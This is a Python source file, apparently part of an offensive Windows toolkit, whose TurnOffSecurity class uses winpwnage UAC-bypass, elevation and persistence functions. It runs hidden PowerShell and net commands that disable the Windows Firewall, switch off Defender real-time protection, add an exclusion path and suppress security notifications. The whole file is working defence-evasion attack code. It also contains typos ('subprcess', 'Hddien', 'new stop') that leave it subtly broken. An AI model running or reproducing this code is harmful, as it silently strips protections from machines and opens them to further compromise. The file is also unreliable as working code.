__import__('sys').path.append('../')
import subprcess
from winpwnage.functions.uac.uacMethod2 import uacMethod2
from winpwnage.functions.persist.persistMethod4 import persistMethod4
from winpwnage.functions.elevate.elevateMethod1 import elevateMethod1


class TurnOffSecurity(object):
	def __init__(self):
		super(TurnOffSecurity, self).__init__()
		
	def FireWall(self):
		stop_firewall = 'powershell -WindowStyle Hddien -Command "Set-NetFirewallProfile -Enabled False"'
		stop_firewall_service = 'net stop mpssvc'
		uacMethod2(['c:\\windows\\system32\\cmd.exe', '/c', stop_firewall])
		uacMethod2(['c:\\windows\\system32\\cmd.exe', '/c', stop_firewall_service])
		persistMethod4(['c:\\windows\\system32\\cmd.exe', '/c', stop_firewall], add=True)
		persistMethod4(['c:\\windows\\system32\\cmd.exe', '/c', stop_firewall_service], add=True)
		persistMethod4(['c:\\windows\\system32\\cmd.exe', '/c', stop_firewall], add=False)
		persistMethod4(['c:\\windows\\system32\\cmd.exe', '/c', stop_firewall_service], add=False)
		elevateMethod1(['c:\\windows\\system32\\cmd.exe', '/c', stop_firewall])
		elevateMethod1(['c:\\windows\\system32\\cmd.exe', '/c', stop_firewall_service])
		subprcess.check_output(stop_firewall, shell = True)
		subprcess.check_output(stop_firewall_service, shell = True)

	def Defender(self):
		stop_defender = 'powershell -WindowStyle Hddien -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
		stop_defender_service = 'new stop Sense'
		add_exclusion = 'powershell -WindowStyle Hddien -Command "Set-MpPreference -ExclusionPath C:\\Temp"'
		off_notifications = r'powershell -WindowStyle Hddien -Command "Set-ItemProperty -Path "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableEnhancedNotifications" -Type DWord -Value 1"'
		uacMethod2(['c:\\windows\\system32\\cmd.exe', '/c', stop_defender])
		uacMethod2(['c:\\windows\\system32\\cmd.exe', '/c', stop_defender_service])
		uacMethod2(['c:\\windows\\system32\\cmd.exe', '/c', add_exclusion])
		uacMethod2(['c:\\windows\\system32\\cmd.exe', '/c', off_notifications])
		persistMethod4(['c:\\windows\\system32\\cmd.exe', '/c', stop_defender], add=True)
		persistMethod4(['c:\\windows\\system32\\cmd.exe', '/c', stop_defender_service], add=True)
		persistMethod4(['c:\\windows\\system32\\cmd.exe', '/c', add_exclusion], add=True)
		persistMethod4(['c:\\windows\\system32\\cmd.exe', '/c', off_notifications], add=True)
		persistMethod4(['c:\\windows\\system32\\cmd.exe', '/c', stop_defender], add=False)
		persistMethod4(['c:\\windows\\system32\\cmd.exe', '/c', stop_defender_service], add=False)
		persistMethod4(['c:\\windows\\system32\\cmd.exe', '/c', add_exclusion], add=False)
		persistMethod4(['c:\\windows\\system32\\cmd.exe', '/c', off_notifications], add=False)
		elevateMethod1(['c:\\windows\\system32\\cmd.exe', '/c', stop_defender])
		elevateMethod1(['c:\\windows\\system32\\cmd.exe', '/c', stop_defender_service])
		elevateMethod1(['c:\\windows\\system32\\cmd.exe', '/c', add_exclusion])
		elevateMethod1(['c:\\windows\\system32\\cmd.exe', '/c', off_notifications])
		subprcess.check_output(stop_defender, shell = True)
		subprcess.check_output(stop_defender_service, shell = True)
		subprcess.check_output(add_exclusion, shell = True)
		subprcess.check_output(off_notifications, shell = True)

